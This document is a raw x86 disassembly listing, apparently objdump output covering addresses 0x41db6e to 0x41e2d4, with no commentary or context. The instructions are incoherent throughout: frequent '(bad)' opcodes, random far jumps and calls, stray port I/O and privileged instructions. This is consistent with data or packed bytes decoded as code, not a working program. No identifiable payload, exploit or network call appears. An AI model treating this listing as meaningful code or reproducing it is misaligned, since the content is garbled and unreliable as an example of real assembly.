  41db6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db6f:	adc    DWORD PTR [ebp-0x4aa4fbb8],eax
  41db75:	dec    eax
  41db76:	lahf   
  41db77:	nop
  41db78:	enter  0xc8bf,0x4d
  41db7c:	xchg   ecx,eax
  41db7d:	jo     0x41dbbd
  41db7f:	adc    eax,0xfcc8de02
  41db84:	(bad)  
  41db85:	(bad)  
  41db86:	das    
  41db87:	retf   0xc2e4
  41db8a:	hlt    
  41db8b:	fild   WORD PTR [ecx]
  41db8d:	jno    0x41db5f
  41db8f:	fnstsw WORD PTR [ebp+0x4174ede7]
  41db95:	in     al,0x2a
  41db97:	or     eax,0x1d9fe59c
  41db9c:	lock ret 0x3fea
  41dba0:	arpl   WORD PTR [eax],ax
	...
  41dbaa:	add    dl,bl
  41dbac:	xor    dl,BYTE PTR [edi-0x20500076]
  41dbb2:	jb     0x41dbb7
  41dbb4:	inc    ebp
  41dbb5:	mov    ds:0x1e3afa5c,eax
  41dbba:	out    dx,al
  41dbbb:	adc    ebx,DWORD PTR [edx+0xae0001]
  41dbc1:	add    BYTE PTR [eax],al
  41dbc3:	xor    eax,0xb64ff472
  41dbc8:	xchg   esp,edi
  41dbca:	mov    al,BYTE PTR [ecx]
  41dbcc:	mov    dl,0x11
  41dbce:	(bad)  
  41dbcf:	hlt    
  41dbd0:	ret    0x581e
  41dbd3:	int3   
  41dbd4:	retf   
  41dbd5:	jp     0x41dbef
  41dbd7:	mov    ebx,0x34bdc942
  41dbdc:	mov    bl,0x62
  41dbde:	pop    ss
  41dbdf:	ins    BYTE PTR es:[edi],dx
  41dbe0:	into   
  41dbe1:	sahf   
  41dbe2:	or     al,0x0
  41dbe4:	and    DWORD PTR [edi-0x48a19170],edx
  41dbea:	add    eax,DWORD PTR [ebx]
  41dbec:	add    BYTE PTR cs:[ecx-0x7e],dl
  41dbf0:	repz mov ecx,0x4e817dde
  41dbf6:	out    0x3,al
  41dbf8:	inc    ebp
  41dbf9:	or     al,0x76
  41dbfb:	out    dx,eax
  41dbfc:	mov    dh,0xdb
  41dbfe:	inc    ebp
  41dc00:	stc    
  41dc01:	xchg   ecx,eax
  41dc02:	dec    esp
  41dc03:	outs   dx,DWORD PTR ds:[esi]
  41dc04:	fld    QWORD PTR [eax]
  41dc06:	imul   edi,DWORD PTR [ecx+0x5fe6409a],0xffffffa3
  41dc0d:	mov    esi,0xb0b28511
  41dc12:	sbb    DWORD PTR [edx-0x3c],eax
  41dc15:	sub    DWORD PTR [ecx+0xd0fd08b],edi
  41dc1b:	das    
  41dc1c:	sahf   
  41dc1d:	aad    0xb4
  41dc1f:	retf   
  41dc20:	or     BYTE PTR [ebp+edx*1-0x30],bl
  41dc24:	push   ecx
  41dc25:	inc    esp
  41dc26:	inc    edx
  41dc27:	mov    edi,0x3b38260
  41dc2c:	bound  ecx,QWORD PTR ds:[ecx-0x23d42823]
  41dc33:	push   cs
  41dc34:	lock dec ebx
  41dc36:	imul   edx,DWORD PTR [ecx-0x41936134],0xffffffc5
  41dc3d:	add    DWORD PTR [eax-0x38],esi
  41dc40:	adc    edi,ecx
  41dc42:	sbb    ah,BYTE PTR [edx]
  41dc44:	adc    al,0x51
  41dc46:	push   ebx
  41dc47:	jge    0x41dc5e
  41dc49:	jp     0x41dc05
  41dc4b:	repnz arpl WORD PTR [eax-0x51c918dc],cx
  41dc52:	lods   al,BYTE PTR ds:[esi]
  41dc53:	pop    ecx
  41dc55:	push   cs
  41dc56:	mov    BYTE PTR [edi-0x55],0xdd
  41dc5a:	fild   WORD PTR [esp+edx*2+0x48cd5dcf]
  41dc61:	push   esp
  41dc62:	adc    bl,BYTE PTR [edx]
  41dc64:	lods   al,BYTE PTR ds:[esi]
  41dc65:	and    DWORD PTR [edi+0x5c426508],eax
  41dc6b:	lock rcr edx,0x2c
  41dc6f:	xchg   esp,eax
  41dc70:	and    BYTE PTR [eax],al
	...
  41dc7a:	add    BYTE PTR [eax-0x1c],cl
  41dc7d:	add    ebx,DWORD PTR [ebx-0x8270051]
  41dc83:	pop    esi
  41dc84:	sub    BYTE PTR [eax+0x6df4c68f],bl
  41dc8a:	or     eax,0x19ac1
  41dc8f:	scas   al,BYTE PTR es:[edi]
  41dc90:	add    BYTE PTR [eax],al
  41dc92:	add    BYTE PTR [edx+0x39],al
  41dc95:	jg     0x41dc41
  41dc97:	push   es
  41dc98:	ins    DWORD PTR es:[edi],dx
  41dc99:	repnz or edi,ebx
  41dc9c:	xchg   ebx,eax
  41dc9d:	sbb    BYTE PTR [ecx+edx*4-0x16],bl
  41dca1:	pop    es
  41dca2:	xchg   esp,eax
  41dca3:	xchg   edx,eax
  41dca4:	sbb    cl,BYTE PTR [esi+eax*8-0x3d]
  41dca8:	les    ebp,FWORD PTR [eax+0x75]
  41dcab:	shl    DWORD PTR [eax-0x4a],cl
  41dcae:	outs   dx,DWORD PTR ds:[esi]
  41dcaf:	scas   al,BYTE PTR es:[edi]
  41dcb0:	mov    BYTE PTR [edx+ecx*4-0x6a],ch
  41dcb4:	sub    DWORD PTR [ebx-0x34],0x2c
  41dcb8:	add    al,0x57
  41dcba:	iret   
  41dcbb:	sbb    al,BYTE PTR [eax+0x9]
  41dcbe:	sub    al,0xc4
  41dcc0:	mov    ds:0xb20bf0ef,eax
  41dcc5:	push   ebp
  41dcc6:	pusha  
  41dcc7:	jae    0x41dd30
  41dcc9:	jl     0x41dc9b
  41dccb:	xchg   ecx,eax
  41dccc:	rol    BYTE PTR [edi+0x29],cl
  41dccf:	pop    ebx
  41dcd0:	xchg   edx,eax
  41dcd1:	jge    0x41dcb0
  41dcd3:	outs   dx,BYTE PTR ds:[esi]
  41dcd4:	push   0x437087ff
  41dcd9:	mov    ecx,0xa6a02240
  41dcde:	push   ebx
  41dcdf:	in     eax,dx
  41dce0:	ret    
  41dce1:	test   bh,dh
  41dce3:	push   es
  41dce4:	pusha  
  41dce5:	push   0xffffffd0
  41dce7:	loopne 0x41dc76
  41dce9:	fdivp  st(5),st
  41dceb:	ss call 0x674e757e
  41dcf1:	lock lods al,BYTE PTR ds:[esi]
  41dcf3:	mov    eax,0xefb0cd38
  41dcf8:	daa    
  41dcf9:	in     eax,0xe2
  41dcfb:	mov    al,0x24
  41dcfd:	push   ss
  41dcfe:	shl    DWORD PTR ds:0xe79ea9e5,0x99
  41dd05:	xchg   ebx,eax
  41dd06:	mov    bl,0x38
  41dd08:	pop    ecx
  41dd09:	iret   
  41dd0a:	or     edi,esi
  41dd0c:	or     BYTE PTR [ecx+0x600af301],dh
  41dd12:	lods   eax,DWORD PTR ds:[esi]
  41dd13:	int3   
  41dd14:	sbb    eax,0xe584495b
  41dd19:	inc    ebx
  41dd1a:	push   ss
  41dd1b:	lods   eax,DWORD PTR ds:[esi]
  41dd1c:	mov    edi,0x90eac7bc
  41dd21:	(bad)
  41dd24:	jl     0x41dd81
  41dd26:	mov    esi,0x2651b36a
  41dd2b:	icebp  
  41dd2c:	stc    
  41dd2d:	ins    DWORD PTR es:[edi],dx
  41dd2e:	push   ebx
  41dd2f:	pop    esi
  41dd30:	xchg   edi,eax
  41dd31:	add    al,0xaa
  41dd33:	jns    0x41dd7a
  41dd35:	hlt    
  41dd36:	outs   dx,BYTE PTR ds:[esi]
  41dd37:	push   ecx
  41dd38:	cmp    al,0xd6
  41dd3a:	xchg   esp,eax
  41dd3b:	std    
  41dd3c:	out    0x88,eax
  41dd3e:	sbb    edx,DWORD PTR [ebx+0xe1]
  41dd44:	add    BYTE PTR [eax],al
  41dd46:	add    BYTE PTR [eax],al
  41dd48:	add    BYTE PTR [eax],al
  41dd4a:	add    BYTE PTR [edx+0x4],dl
  41dd4d:	mov    ds:0x72a6f682,al
  41dd52:	aam    0x6d
  41dd54:	xor    dh,BYTE PTR [edx]
  41dd56:	and    eax,0x46fecbdd
  41dd5b:	outs   dx,DWORD PTR ds:[esi]
  41dd5c:	fwait
  41dd5d:	add    DWORD PTR [eax],eax
  41dd5f:	scas   al,BYTE PTR es:[edi]
  41dd60:	add    BYTE PTR [eax],al
  41dd62:	add    BYTE PTR [ecx+0x73cfd0ca],dl
  41dd68:	mov    es,WORD PTR [edx+0x4a]
  41dd6b:	xor    edi,edx
  41dd6d:	je     0x41dd7e
  41dd6f:	mov    cl,0xe9
  41dd71:	push   edi
  41dd72:	test   BYTE PTR [esi],dl
  41dd74:	pop    ebx
  41dd75:	test   al,0xf
  41dd77:	popf   
  41dd78:	fisub  WORD PTR [ecx+0x287dd273]
  41dd7e:	pop    ebx
  41dd7f:	jp     0x41ddbf
  41dd81:	js     0x41dd7d
  41dd83:	jl     0x41dd64
  41dd85:	cmp    al,0x6c
  41dd87:	fst    QWORD PTR [eax]
  41dd89:	outs   dx,BYTE PTR ds:[esi]
  41dd8a:	add    al,0x0
  41dd8c:	mov    bl,0x13
  41dd8e:	add    ebx,edi
  41dd90:	lock nop
  41dd92:	lods   al,BYTE PTR ds:[esi]
  41dd93:	adc    BYTE PTR [ebp+0x3c],0xa9
  41dd97:	inc    eax
  41dd98:	jmp    0xb896:0x996bece6
  41dd9f:	add    dh,ah
  41dda1:	inc    esi
  41dda2:	loopne 0x41dd5f
  41dda4:	std    
  41dda5:	inc    esi
  41dda6:	inc    edi
  41dda7:	cli    
  41dda8:	icebp  
  41dda9:	jp     0x41dd53
  41ddab:	jne    0x41ddef
  41ddad:	sub    eax,0xc0f11d
  41ddb2:	mov    cl,0x64
  41ddb4:	mov    ebp,0xa3718b1b
  41ddb9:	dec    esp
  41ddba:	pop    edx
  41ddbb:	cld    
  41ddbc:	daa    
  41ddbd:	pusha  
  41ddbe:	stc    
  41ddbf:	cld    
  41ddc0:	icebp  
  41ddc1:	stos   BYTE PTR es:[edi],al
  41ddc2:	pop    esp
  41ddc3:	adc    dl,BYTE PTR [ecx]
  41ddc5:	push   edx
  41ddc6:	not    BYTE PTR ds:0x7abb25fe
  41ddcc:	inc    ebx
  41ddcd:	xchg   esi,eax
  41ddce:	cmp    ah,BYTE PTR [ebp+0x726bf529]
  41ddd4:	js     0x41dd7e
  41ddd6:	sub    ah,BYTE PTR [edx]
  41ddd8:	push   edi
  41ddd9:	dec    edi
  41ddda:	jbe    0x41de55
  41dddc:	sub    BYTE PTR [esi],0xc6
  41dddf:	sbb    ebp,0x6c224ca5
  41dde5:	jg     0x41ddf0
  41dde7:	stos   BYTE PTR es:[edi],al
  41dde8:	outs   dx,BYTE PTR ds:[esi]
  41dde9:	dec    ebp
  41ddea:	inc    ebp
  41ddeb:	bound  edx,QWORD PTR [edi-0x94d18b5]
  41ddf1:	dec    eax
  41ddf2:	dec    edi
  41ddf3:	push   cs
  41ddf4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddf6:	dec    esp
  41ddf7:	mov    bl,0x9c
  41ddf9:	mov    al,ds:0x226bd9ec
  41ddfe:	pop    ebx
  41ddff:	push   ecx
  41de00:	ds dec ebx
  41de02:	or     al,0x3b
  41de04:	mov    ebp,0xed053867
  41de09:	int    0xe2
  41de0b:	jmp    0xbdc2260f
  41de10:	outs   dx,DWORD PTR ds:[esi]
	...
  41de19:	add    BYTE PTR [eax],al
  41de1b:	cmp    BYTE PTR [edx-0x6a],ch
  41de1e:	add    edx,esi
  41de20:	(bad)  
  41de21:	mov    ebp,0xdb4ef67b
  41de26:	out    0xa,eax
  41de28:	xchg   esi,eax
  41de29:	outs   dx,DWORD PTR ds:[esi]
  41de2a:	xor    bl,BYTE PTR ds:0xae00019c
  41de30:	add    BYTE PTR [eax],al
  41de32:	add    BYTE PTR [edx],dh
  41de34:	push   cs
  41de35:	gs pop ebp
  41de37:	jns    0x41de48
  41de39:	sahf   
  41de3a:	daa    
  41de3b:	jb     0x41de33
  41de3d:	fistp  QWORD PTR [esi-0x36]
  41de40:	int    0x85
  41de42:	add    DWORD PTR [ecx+0x67f0901c],esi
  41de48:	lods   al,BYTE PTR ds:[esi]
  41de49:	loop   0x41ddcb
  41de4b:	loope  0x41de37
  41de4d:	aam    0x8c
  41de4f:	mov    eax,0xdc46937e
  41de54:	aaa    
  41de55:	pop    ecx
  41de56:	xor    BYTE PTR [ecx],bl
  41de58:	icebp  
  41de59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de5a:	xchg   BYTE PTR [edx-0x77],bl
  41de5d:	sbb    esi,esp
  41de5f:	hlt    
  41de60:	inc    edi
  41de61:	rol    BYTE PTR [eax],0x80
  41de64:	inc    edi
  41de65:	sti    
  41de66:	ds pop esi
  41de68:	outs   dx,BYTE PTR ds:[esi]
  41de69:	stos   BYTE PTR es:[edi],al
  41de6a:	jno    0x41deb2
  41de6c:	and    edi,DWORD PTR [esi+0x40]
  41de6f:	leave  
  41de70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de71:	lds    ecx,FWORD PTR [edx-0x57]
  41de74:	cmp    ebx,DWORD PTR [edi-0x231c8e17]
  41de7a:	pop    eax
  41de7b:	cli    
  41de7c:	or     eax,DWORD PTR [ecx+0x18]
  41de7f:	pop    eax
  41de80:	cli    
  41de81:	dec    ebx
  41de82:	cmp    al,0x2e
  41de84:	aaa    
  41de85:	fisubr WORD PTR [ebp+0xe09083d]
  41de8b:	fisubr DWORD PTR [edi+0x60]
  41de8e:	xor    eax,0xfac3fa3
  41de93:	test   al,0xe4
  41de95:	or     al,0x98
  41de97:	sub    DWORD PTR [ebp+0x1c503ec8],esi
  41de9d:	inc    esp
  41de9e:	xchg   ch,bh
  41dea0:	push   ds
  41dea1:	test   al,0x16
  41dea3:	mov    eax,ds:0xe046512c
  41dea8:	in     eax,0x2d
  41deaa:	and    al,0xfa
  41deac:	cmp    eax,0x749faac6
  41deb1:	sahf   
  41deb2:	iret   
  41deb3:	mov    ah,0x4f
  41deb5:	iret   
  41deb6:	mov    ebp,0x7daaf0d5
  41debb:	xlat   BYTE PTR ds:[ebx]
  41debc:	(bad)  
  41debd:	fdivr  QWORD PTR [esi]
  41debf:	repnz sub di,ax
  41dec3:	jg     0x41de53
  41dec5:	and    ah,ch
  41dec7:	dec    eax
  41dec8:	lock or edx,DWORD PTR [ebx+0x5c715328]
  41decf:	pop    edx
  41ded0:	imul   ecx,DWORD PTR ds:0x19973d6d,0xc24213b1
  41deda:	mov    dl,0xd7
  41dedc:	mov    eax,ds:0x25b47bed
	...
  41dee9:	add    BYTE PTR [eax],al
  41deeb:	jmp    0x7a7259a9
  41def0:	repz jmp 0x41deec
  41def3:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41def7:	push   ecx
  41def8:	ins    DWORD PTR es:[edi],dx
  41def9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41defa:	or     bl,cl
  41defc:	pushf  
  41defd:	add    DWORD PTR [eax],eax
  41deff:	scas   al,BYTE PTR es:[edi]
  41df00:	add    BYTE PTR [eax],al
  41df02:	add    cl,bh
  41df04:	lds    ecx,FWORD PTR [eax-0x58]
  41df07:	ret    
  41df08:	adc    esi,ebp
  41df0a:	xchg   esi,eax
  41df0b:	sbb    al,0x5d
  41df0e:	and    ch,BYTE PTR [edi+edx*2-0x68]
  41df12:	and    DWORD PTR [esi+0x36],ebx
  41df15:	push   0x1794ef96
  41df1a:	out    0x63,al
  41df1c:	pusha  
  41df1d:	(bad)  
  41df1e:	and    al,0x46
  41df20:	inc    edi
  41df21:	jmp    0x38a34cfb
  41df26:	xchg   edx,ecx
  41df28:	loopne 0x41df86
  41df2a:	mov    cl,0x5c
  41df2c:	pop    edx
  41df2d:	adc    edx,DWORD PTR [edx+0x44]
  41df30:	dec    eax
  41df31:	and    DWORD PTR [eax-0x5e],edi
  41df34:	sub    ch,ah
  41df36:	in     al,dx
  41df37:	cmc    
  41df38:	stos   BYTE PTR es:[edi],al
  41df39:	and    DWORD PTR [esi+ebp*2-0x26],ecx
  41df3d:	imul   edx,edi,0x53fca80d
  41df43:	mov    ebx,0xcbf5786d
  41df48:	(bad)  
  41df49:	push   ebx
  41df4a:	pop    ds
  41df4b:	pop    ss
  41df4c:	cld    
  41df4d:	xor    ecx,ebp
  41df4f:	std    
  41df50:	mov    bh,0x1
  41df52:	jb     0x41df3a
  41df54:	sbb    dl,al
  41df56:	mov    ebp,0x3e1908b3
  41df5b:	mov    fs,WORD PTR [ebp-0x39084500]
  41df61:	call   edi
  41df63:	stos   BYTE PTR es:[edi],al
  41df64:	mov    edx,0xa4122ee6
  41df69:	or     DWORD PTR [esi-0x52157065],0xffffffbe
  41df70:	bound  ecx,QWORD PTR [ecx+ebp*2+0x51]
  41df74:	cwde   
  41df75:	fist   DWORD PTR [ebx]
  41df77:	adc    ch,BYTE PTR [edi]
  41df79:	bound  edi,QWORD PTR [eax]
  41df7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df7c:	mul    BYTE PTR [ebp-0x7]
  41df7f:	mov    esp,0x99a4df5a
  41df84:	add    eax,0xa739cf71
  41df89:	loop   0x41df75
  41df8b:	add    eax,0xadea9428
  41df90:	xchg   ecx,eax
  41df91:	xchg   esi,eax
  41df92:	scas   al,BYTE PTR es:[edi]
  41df93:	pop    eax
  41df94:	and    DWORD PTR [edx+0x28],0x69
  41df98:	pop    esp
  41df99:	xlat   BYTE PTR ds:[ebx]
  41df9a:	cmp    ecx,ecx
  41df9c:	push   0xe1d9ea79
  41dfa1:	sub    bl,BYTE PTR [ecx]
  41dfa3:	rcr    DWORD PTR [esi-0x572f2467],1
  41dfa9:	outs   dx,BYTE PTR ds:[esi]
  41dfaa:	test   al,0x53
  41dfac:	loope  0x41df5a
  41dfae:	test   BYTE PTR ds:0x93,dh
  41dfb4:	add    BYTE PTR [eax],al
  41dfb6:	add    BYTE PTR [eax],al
  41dfb8:	add    BYTE PTR [eax],al
  41dfba:	add    BYTE PTR [ebx+0x41],bl
  41dfbd:	pop    ebx
  41dfbe:	iret   
  41dfbf:	pop    ebx
  41dfc0:	(bad)  
  41dfc2:	aad    0xf
  41dfc4:	ss dec esp
  41dfc6:	dec    esi
  41dfc7:	cmp    ah,BYTE PTR [edx+0x54]
  41dfca:	xchg   edx,eax
  41dfcb:	jns    0x41df6a
  41dfcd:	add    DWORD PTR [eax],eax
  41dfcf:	scas   al,BYTE PTR es:[edi]
  41dfd0:	add    BYTE PTR [eax],al
  41dfd2:	add    ah,bh
  41dfd4:	xchg   ebx,eax
  41dfd5:	cmp    eax,0x902ee604
  41dfda:	aas    
  41dfdb:	dec    ebp
  41dfdc:	cmp    BYTE PTR [ebp-0x52],cl
  41dfdf:	fldcw  WORD PTR [edi]
  41dfe1:	ja     0x41dffe
  41dfe3:	mov    fs,WORD PTR [eax+0x365a4931]
  41dfe9:	cli    
  41dfea:	hlt    
  41dfeb:	fist   WORD PTR [eax-0x64ff40a4]
  41dff1:	mov    ch,ch
  41dff3:	test   al,0xb6
  41dff5:	imul   edi,ecx,0xfc2932f
  41dffb:	(bad)
  41dffe:	call   0x683c:0x8a9cab68
  41e005:	es sbb eax,0x2c76ff13
  41e00b:	(bad)  
  41e00c:	iret   
  41e00d:	fstp   QWORD PTR [eax+0x377b21e3]
  41e013:	(bad)  
  41e014:	cmc    
  41e015:	mov    WORD PTR [edi],es
  41e017:	sahf   
  41e018:	mov    dh,0xc0
  41e01a:	mov    dh,0xf0
  41e01c:	rcr    BYTE PTR [edi-0x20eb83b3],cl
  41e022:	mov    DWORD PTR [ecx+esi*4-0x66244811],edx
  41e029:	pusha  
  41e02a:	fsubr  QWORD PTR [edi]
  41e02c:	es (bad) 
  41e02e:	mov    edx,0x32de0e84
  41e033:	xchg   ebp,eax
  41e034:	and    dh,bh
  41e036:	and    dl,BYTE PTR [ebx]
  41e038:	sbb    eax,0xb2429f5a
  41e03d:	std    
  41e03e:	mov    bh,0x36
  41e040:	(bad)  
  41e041:	lds    esp,FWORD PTR [ebp-0x56]
  41e044:	test   eax,0x65eae784
  41e049:	xchg   DWORD PTR [edx-0x10bc6a80],ecx
  41e04f:	shl    DWORD PTR es:[bx],cl
  41e053:	xchg   ecx,eax
  41e054:	stos   BYTE PTR es:[edi],al
  41e055:	xchg   BYTE PTR [ebp-0x72],ah
  41e058:	lock lods eax,DWORD PTR ds:[esi]
  41e05a:	mov    esp,0xe02bece
  41e05f:	mov    ah,0x8b
  41e061:	loop   0x41e0da
  41e063:	and    DWORD PTR gs:[ecx-0x3c],0x77
  41e068:	ins    DWORD PTR es:[edi],dx
  41e069:	mov    DWORD PTR [ebp+eax*8+0x6e],esp
  41e06d:	lods   al,BYTE PTR ds:[esi]
  41e06e:	sahf   
  41e06f:	jb     0x41e063
  41e071:	(bad)  
  41e072:	(bad)  [eax+0x13]
  41e075:	popf   
  41e076:	test   al,0x3f
  41e078:	fmulp  st(1),st
  41e07a:	iret   
  41e07b:	in     al,0xd0
  41e07d:	stc    
  41e07e:	inc    esp
  41e07f:	sub    DWORD PTR [edx+0x0],esp
	...
  41e08a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e090:	cld    
  41e091:	(bad)  [edi-0x65be08a1]
  41e097:	jne    0x41e0dc
  41e099:	stos   BYTE PTR es:[edi],al
  41e09a:	cld    
  41e09b:	daa    
  41e09c:	sahf   
  41e09d:	add    DWORD PTR [eax],eax
  41e09f:	scas   al,BYTE PTR es:[edi]
  41e0a0:	add    BYTE PTR [eax],al
  41e0a2:	add    BYTE PTR ds:0x844313e5,bh
  41e0a8:	xor    edx,DWORD PTR ds:0x79b5bced
  41e0ae:	addr16 call 0xf2f3:0xf4bfe2d
  41e0b6:	fimul  WORD PTR [esi-0x4c34af87]
  41e0bc:	mov    al,ds:0x7701cda6
  41e0c1:	xor    eax,0xfce61c00
  41e0c6:	ret    
  41e0c7:	paddsw mm7,QWORD PTR ds:0x1930b48d
  41e0ce:	jp     0x41e144
  41e0d0:	mov    esp,db7
  41e0d3:	inc    esp
  41e0d4:	add    ah,BYTE PTR [edi-0x6ba9a1d3]
  41e0da:	enter  0x64ff,0x9a
  41e0de:	pop    esp
  41e0df:	pop    edi
  41e0e0:	leave  
  41e0e1:	dec    esp
  41e0e2:	pop    esp
  41e0e3:	jecxz  0x41e0e4
  41e0e5:	jle    0x41e0a2
  41e0e7:	sar    DWORD PTR [ecx],cl
  41e0e9:	fld    QWORD PTR [ebx]
  41e0eb:	pop    ebp
  41e0ec:	push   ebp
  41e0ed:	data16 test al,0x42
  41e0f0:	mov    esi,DWORD PTR [ebp-0x7c273914]
  41e0f6:	sbb    eax,0x6c28e76e
  41e0fb:	add    bh,BYTE PTR [ecx]
  41e0fd:	adc    DWORD PTR [esi+0x268351cc],esi
  41e103:	sbb    eax,0xed852bd4
  41e108:	add    eax,0xb2a22dd2
  41e10d:	dec    ecx
  41e10e:	test   al,0x39
  41e110:	pusha  
  41e111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e112:	dec    ebx
  41e113:	mov    al,0x2d
  41e115:	pop    ds
  41e116:	xchg   ebx,eax
  41e117:	mov    ebx,0x122dcb51
  41e11c:	inc    ebp
  41e11d:	push   ss
  41e11e:	daa    
  41e11f:	and    dl,BYTE PTR [ebp-0x4]
  41e122:	or     edi,DWORD PTR [ebp+0x20]
  41e125:	jnp    0x41e0ca
  41e127:	push   esi
  41e128:	stc    
  41e129:	shl    DWORD PTR [edi-0x6121ae90],1
  41e12f:	les    esi,FWORD PTR [esi-0x4e31b117]
  41e135:	gs inc esp
  41e137:	cmp    eax,esp
  41e139:	adc    bh,BYTE PTR [ebx-0x6c7e15a7]
  41e13f:	jp     0x41e173
  41e141:	adc    BYTE PTR ds:0x32e83025,ah
  41e147:	xor    al,0x99
  41e149:	setae  BYTE PTR [eax+0x7f]
  41e14d:	shr    DWORD PTR [esi+0x94b9],0x0
  41e154:	add    BYTE PTR [eax],al
  41e156:	add    BYTE PTR [eax],al
  41e158:	add    BYTE PTR [eax],al
  41e15a:	add    BYTE PTR [esi+0x73],ch
  41e15d:	lock retf 0xcbfd
  41e161:	jle    0x41e15a
  41e163:	repz xor eax,0x6d5a8ce9
  41e169:	std    
  41e16a:	hlt    
  41e16b:	aad    0x9e
  41e16d:	add    DWORD PTR [eax],eax
  41e16f:	scas   al,BYTE PTR es:[edi]
  41e170:	add    BYTE PTR [eax],al
  41e172:	add    BYTE PTR [ebp-0xd],cl
  41e175:	in     al,dx
  41e176:	jae    0x41e182
  41e178:	retf   0xc313
  41e17b:	cmp    al,0xb3
  41e17d:	aaa    
  41e17e:	loope  0x41e1a1
  41e180:	mov    gs,WORD PTR [ecx]
  41e182:	adc    bl,BYTE PTR [ecx]
  41e184:	inc    esi
  41e185:	cmp    edx,edi
  41e187:	xlat   BYTE PTR ds:[ebx]
  41e188:	push   ecx
  41e189:	into   
  41e18a:	out    dx,al
  41e18b:	cmp    BYTE PTR ss:[ebx],dl
  41e18e:	cmp    al,0xae
  41e190:	mov    edi,0xaa01182a
  41e195:	xchg   esp,eax
  41e196:	das    
  41e197:	pop    ebp
  41e198:	dec    ebx
  41e199:	cwde   
  41e19a:	push   0x2e
  41e19c:	pushf  
  41e19d:	pusha  
  41e19e:	lock pusha 
  41e1a0:	int    0x9b
  41e1a2:	sbb    esi,DWORD PTR [edx]
  41e1a4:	ret    
  41e1a5:	push   ecx
  41e1a6:	clc    
  41e1a7:	aad    0x72
  41e1a9:	arpl   WORD PTR [ecx+0x675a4aec],bx
  41e1af:	nop
  41e1b0:	mov    ds:0x9b71188,eax
  41e1b5:	add    BYTE PTR [ebp-0x39],ch
  41e1b8:	jae    0x41e1bb
  41e1ba:	sti    
  41e1bb:	xchg   edi,eax
  41e1bc:	xor    DWORD PTR [esi+0x68ae3441],esi
  41e1c2:	fmul   QWORD PTR [esi-0xd]
  41e1c5:	dec    edi
  41e1c6:	xchg   ebx,eax
  41e1c7:	inc    edi
  41e1c8:	mov    al,ds:0x7dce0091
  41e1cd:	dec    esi
  41e1ce:	jne    0x41e150
  41e1d0:	mov    ds:0xca566ece,al
  41e1d5:	inc    ebx
  41e1d6:	hlt    
  41e1d7:	mov    WORD PTR [ebx+0x16094b6],?
  41e1dd:	or     edx,eax
  41e1df:	push   esp
  41e1e0:	dec    ecx
  41e1e1:	(bad)  
  41e1e2:	sbb    eax,0x6e9fc2df
  41e1e7:	sti    
  41e1e8:	into   
  41e1e9:	ret    
  41e1ea:	jp     0x41e1d3
  41e1ec:	sbb    BYTE PTR [edx+eiz*2],0x6c
  41e1f0:	pusha  
  41e1f1:	sub    al,0xd6
  41e1f3:	loope  0x41e25e
  41e1f5:	push   edi
  41e1f6:	mov    edx,0x6244933f
  41e1fb:	rcl    BYTE PTR [ebp+0x26],cl
  41e1fe:	test   al,0x6f
  41e200:	cmp    ebx,ebx
  41e202:	push   eax
  41e203:	mov    dh,0x96
  41e205:	scas   eax,DWORD PTR es:[edi]
  41e206:	lea    eax,[eax]
  41e208:	(bad)  
  41e209:	pop    esi
  41e20a:	xchg   edx,eax
  41e20b:	xor    BYTE PTR [ecx],dh
  41e20d:	jno    0x41e241
  41e20f:	in     al,dx
  41e210:	repz and eax,0x6fff6396
  41e216:	dec    eax
  41e217:	add    BYTE PTR [esi+0x7f4a43db],bl
  41e21d:	ss mov cl,0xf8
  41e220:	push   esi
	...
  41e229:	add    BYTE PTR [eax],al
  41e22b:	cmc    
  41e22c:	adc    al,0xae
  41e22e:	adc    ebp,edi
  41e230:	mov    ebx,0x84e6f6fd
  41e235:	lds    ebp,FWORD PTR [edx+0x7cbdd2cf]
  41e23b:	sbb    DWORD PTR [edi+0xae0001],0x0
  41e242:	add    BYTE PTR [ebx],ah
  41e244:	mov    edx,DWORD PTR [edx+0x6faae94e]
  41e24a:	shl    eax,1
  41e24c:	stc    
  41e24d:	mov    dl,0x68
  41e24f:	lds    eax,FWORD PTR [edi]
  41e251:	xor    BYTE PTR [ebx],0x1e
  41e254:	push   0xfbf09081
  41e259:	push   0x6af6394e
  41e25e:	data16 jns 0x41e1e1
  41e261:	shl    esi,0xc6
  41e264:	and    ah,0x45
  41e267:	add    dh,BYTE PTR [ecx+0x6670a08d]
  41e26d:	inc    ebx
  41e26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e26f:	and    eax,0x683e592d
  41e274:	push   ecx
  41e275:	sbb    ebx,edx
  41e277:	mov    ecx,0xd5aaa8da
  41e27c:	xchg   edx,eax
  41e27d:	cwde   
  41e27e:	cwde   
  41e27f:	mov    edx,0x33657799
  41e284:	jno    0x41e249
  41e286:	pop    ebx
  41e287:	xor    esp,DWORD PTR [edx-0x4cf9b69b]
  41e28d:	xchg   esp,eax
  41e28e:	addr16 push ebp
  41e290:	or     eax,0x9c26aec2
  41e295:	sbb    al,0xb9
  41e297:	and    eax,0x4141d726
  41e29c:	mov    ecx,0x142f565f
  41e2a1:	pop    ds
  41e2a2:	add    cl,BYTE PTR [eax+0x783fcf93]
  41e2a8:	jg     0x41e23a
  41e2aa:	xor    BYTE PTR [esi-0x3bfa1476],ah
  41e2b0:	sub    al,0x9e
  41e2b2:	das    
  41e2b3:	xor    dh,bl
  41e2b5:	ja     0x41e288
  41e2b7:	(bad)  
  41e2b8:	fisttp DWORD PTR [esi+ecx*2-0x2ae2366e]
  41e2bf:	dec    edx
  41e2c0:	scas   eax,DWORD PTR es:[edi]
  41e2c1:	mov    ecx,0x8e040403
  41e2c6:	leave  
  41e2c7:	and    DWORD PTR [edx-0x66],eax
  41e2ca:	in     eax,dx
  41e2cb:	push   eax
  41e2cc:	scas   eax,DWORD PTR es:[edi]
  41e2cd:	cli    
  41e2ce:	cmp    bh,ah
  41e2d0:	cld    
  41e2d1:	in     eax,dx
  41e2d2:	dec    edi
  41e2d3:	push   esi
  41e2d4:	pop    edi
